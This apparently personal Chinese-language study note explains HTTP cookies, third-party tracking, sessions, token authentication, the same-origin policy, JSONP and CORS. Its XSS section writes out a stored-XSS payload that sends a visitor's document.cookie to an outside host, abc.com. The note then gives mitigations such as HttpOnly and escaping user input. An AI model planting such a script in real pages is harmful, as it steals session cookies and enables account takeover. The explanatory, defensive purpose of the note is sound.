http请求是无状态的，但应用需要维持一些状态

cookie本质是http的header，可以是请求头部，也可以是响应头部，因此限制大小在4k内

# cookie
通常服务器会给响应报文添加 Set-Cookie:.... 头部，来添加cookie

在服务器选择返回的cookie通常有多个属性

```
    type Cookie struct {
        Name  string
        Value string

        Path       string    // optional，当请求匹配上该路径时才携带cookie
        Domain     string    // optional，当请求该域名时才携带cookie
        Expires    time.Time // optional，持久性cookie，这个时间点后，浏览器才会销毁cookie
        RawExpires string    // for reading cookies only

        // MaxAge=0 means no 'Max-Age' attribute specified.,会在退出浏览器后删除该cookie
        // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'，马上，现在就给删了
        // MaxAge>0 means Max-Age attribute present and given in seconds，经过多少秒后失效
        MaxAge   int
        Secure   bool   //true，cookie只有在https加密的情况下才会被发给客户端
        HttpOnly bool  //客户端无法通过js获取cookie，但是并不能完全防止xss攻击
        SameSite SameSite   //
        Raw      string
        Unparsed []string // Raw text of unparsed attribute-value pairs，不对转义过的键值对进行解析
    }
```

    Set-Cookie:key="i am a cookie"; Max-Age=10; HttpOnly

如果不设置Max-Age或值为0，则浏览器获取cookie后会暂存，下次再访问获取到cookie的domain+path网页(一般只要是相同顶级域名就携带)，会携带cookie，直到浏览器被关闭后才清除

如果值>0，则会缓存，直到过期被删除

浏览器通过Cookie头部携带接受的和缓存的cookie发送给服务器

## 第三方cookie
假设a、b、c 三个页面植入了 d 公司的广告，你请求这三个页面都会再去请求 d 服务器的一个广告图片

1. 你请求了a页面，解析页面后去请求d服务器的一个图片，d服务器返回给你一个cookie：user="kanggege";page="a";domain="advertisement.com"
2. 后来你请求b页面，同样要请求一个d服务器的广告图片,cookie：user="kanggege";page="b";domain="advertisement.com"
3. c页面,cookie：user="kanggege";page="c";domain="advertisement.com"

通过识别你的身份和你访问网页的标识，可以知道你的访问记录，更偏向于访问哪种类型的网站，从而给你推送对应的广告

甚至追踪你所有的访问记录

## 跨站脚本XSS
假设有一个论坛网站，我在下面留言

    <script>window.location=http://abc.com?cookie=docuemnt.cookie</script>

我的留言被存入数据库，并再其他人访问时从数据库查询出来，并加载到页面中，则该脚本生效，我就获取到了访问者的cookie

一般cookie会存储登录状态，这是我就可以用这个cookie伪装他的身份登录

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。

最好还是要将从用户得到的信息在存入数据库之前进行转义，这样更安全

# session
通过客户端的cookie中携带的sessionid可以在服务器上维护一个对应的session

session一般是类似 map\[key]data 的数据结构，

所以可以通过session维护用户的登录操作，具体实现如下：

1. 接受到一个请求，获取请求中request的cookie值，如果检查有sessionid且值存在服务器，则用户已经登录，通过sessionid获取session，从session中获取用户身份信息，否则用户未登录
2. 跳转用户登录，验证账号密码，response中设置cookie：sessionid=xxxxx，在服务器创建session，将session中存入一个数据(例如：userid)保存用户身份信息

## 单机
这种登录方式很简单，但是局限于单机应用，如果几十万的用户登录，一个服务器维护几十万session，就很吃力了，如果采用多个机器负载均衡，就要两个机器间同步session，否则第二次请求发到没有session的机器上，就要重新登录，局限太多

## 缓存
于是就有了缓存技术，用一个机器运行类redis数据库专门存储session，所有机器都去redis机器查，但是这个机器挂了所有人就要重新登录一次了,gg

为了避免单节点失效，就有了分布式session，为了存个session搞这么大的事，cookieid还容易被劫持，真麻烦，有没有简单方法

## token
要是能把session存在客户端就好了，众所周知这是不安全的，要是能让他安全存在客户端，就不用操心session存储和cookie劫持了

回到起点想一想session的作用，如果用户登录就给他创建一个session返回cookie，通过cookieid查找session，通过查找结果就能知道是否登录

1. 用户账号密码登录
2. 服务器验证，成功后创建sessionid-value，将sessionid作为cookie值返回
3. 用户访问同一个域名下的网页自动携带cookie即sessionid
4. 服务器获取cookie，得到sessionid，查找对应value，获取用户登录状态以及其他信息

其本质就是维护一个登录状态，为什么不直接返回cookie维护呢？因为用户可以在客户端伪造cookie，但他无法在服务器上伪造session

如果我们创造一个只有登录后才会有且无法伪造的cookie，服务端就不需要维护session，登录状态维护在客户端，问题就解决了

来吧万能的加密算法

我们可以将 **SHA256(uid + 秘钥) 得到一个token**，返回给客户端让他以后登录都带着token，这个秘钥他不知道，所以客户端无法伪造，而服务端可以通过秘钥检测token是否正确。就解决了sessionid的问题，但是token还是能被劫持！

基于token的认证服务如下

1. 用户账号密码登录
2. 服务器验证，正确后查找uid，token=单向加密算法(登录状态 + 秘钥)，将登录状态+token返回给客户端
3. 用户访问该域名(或还能指定其他域名)时自动携带
4. 服务器验证token是否正确，判断登录状态


# 同源策略
如果两个页面的**协议、端口和域名**都相同，则两个页面具有相同的源(注：http和https属于不同协议)

同源政策起初目的是为了保护cookie，A网站设置的cookie，B网站不能打开，防止cookie被恶意窃取

随着互联网发展，同源越来越严格，目前如果非同源将有三种行为受限制

1. Cookie、LocalStorage、IndexDB无法读取
2. DOM无法获取
3. ajax请求不能发送

前两个限制是有必要的，但是ajax的限制会给开发带来很多不便

## cookie
两个网页一级域名相同，二级域名不同，浏览器允许通过document.domain共享cookie

A：http://nb.kanggege.com/a.html、B:http://nba.kanggege.com/b.html，那么只要设置相同的document.domain，两个网页可以共享cookie

服务器在设置cookie时也可以指定一级域名，Seet-Cookie：key=val; domain=.kanggege.com; path=/ 

这样二级三级域名不用做任何设置，都能读取这个cookie

## ajax
同源政策规定，ajax只能发给同源的网址，否则就报错，有三个方法避免这个限制


# jsonp
script标签可以发送给任意的网站，不受同源影响，就有大神搞出了jsonp

```
function addScriptTag(src){
    var script = document.createElement('script')
    script.setAttribute('type','text/javascript')
    script.src = src
    document.body.appendChild(script)
}

addScriptTag('http://kanggege.com/api?callback=task')

function task(data){
    console.log(data) //后台会将数据放到data中，这里定义请求到数据的回调函数
}

```

服务器接收到请求后，返回一段js脚本，就是一个函数调用，task({backdata:data})

jsonp作为绕过跨域限制的小手段可以兼容所有浏览器，但是只能发出get请求，就一定会受到get请求url长度的限制

# CORS
既然跨域请求存在，就需要浏览器去解决他，针对不同类型的ajax跨域请求，浏览器会自动执行CORS通信，这个通信过程由浏览器自动执行，会在头部添加一些信息，有时还会多出一次附加请求，但用户无需编写额外代码也感知不到

## 简单请求
1. HEAD、GET、POST 三种请求之一
2. HTTP头部信息不超出以下字段
    1. accept、accept-language、content-language、last-event-id、content-type: application/x-www-form-urlencoded、multipart/form-data、text/plain

对于简单请求，浏览器会在发送的时候添加 Origin 字段，Origin: http://api.kangege.com 说明来自哪个源(协议+域名+端口)。服务器会根据这个字段决定是否同一这个请求

如果Origin在允许范围内，服务器返回的信息会多出几个头部字段

    Access-Control-Allow-Origin:*
    Access-Control-Allow-Credentials: true
    Access-Control-Expose-Headers: FooBar
    Content-Type: text/html; charset=utf-8

1. Access-Control-Allow-Origin，这个字段是必须的，值代表了可以接收请求的域名，如果是 * 代表接收任意域名请求
2. Access-Control-Allow-Credentials，可选值，表示是否允许发送cookie，默认是不可发送
3. 该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。

如果Origin指定的源不在服务器设定允许范围内，就返回一个正常的HTTP请求，浏览器发现返回头信息没有Access-Control-Allow-Origin字段，就知道出错了，抛出一个错误

上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。另一方面，开发者必须在AJAX请求中打开withCredentials属性。

## 非简单请求
对服务器有特殊要求的请求，比如请求方法是 PUT、DELETE，或者 Content-Type:application/json

非简单请求浏览器会先发起一个options请求做预检，询问服务器支持的域名、请求方法、请求头，如果ajax请求不满足服务器配置，则报错，满足再发送ajax请求

服务器预检完后，除了回复上面简单请求的字段，还会回复Access-Control-Max-Age，表示该预检有效事件，避免每次ajax都需要预检

CORS比JSONP更麻烦，但更强大，JSONP的优势在于支持老旧浏览器